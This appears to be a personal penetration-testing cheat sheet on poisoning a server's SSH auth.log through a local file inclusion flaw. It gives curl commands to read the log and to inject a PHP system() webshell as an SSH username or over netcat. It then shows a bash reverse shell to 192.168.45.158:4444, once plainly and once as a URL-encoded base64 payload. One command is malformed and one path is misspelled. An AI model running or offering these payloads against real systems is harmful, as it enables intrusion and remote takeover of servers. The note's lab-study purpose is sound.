-- -
It's the same as for the [[Apache Log Poisoning]], but a different log file so different methodology.
### Enum
Say you found LFI in an #apache server, try to access the `auth.log` file in the web root
```bash
# You are looking for:
# /var/log/auth.log
curl http://192.168.249.80/console/file.php?file=/var/log/auth.log
```
### Exploit
##### Submit payload to log
Try to log into SSH with the payload as the user so it gets written to the log file, something like:
```bash
# This may not work
ssh '<?php system($_GET['c']); ?>'@192.168.249.80

# you can use netcat:
nc -nv <ip> 22
<?php system($_GET['cmd']); ?>
```
##### Use webshell to get a reverse shell
```bash
curl http://192.168.249.80/conosle/file.php?file=bash -i >& /dev/tcp/192.168.45.158/4444 0>&1

# you may need to encode the payload to get it to run, so take the command payload, stick it into burp's decoder, URL encode it, and it should look something like the following. 
curl "http://192.168.138.80/console/file.php?file=/var/log/auth.log&cmd=%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4f%54%49%75%4d%54%59%34%4c%6a%51%31%4c%6a%45%31%4f%43%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68"
```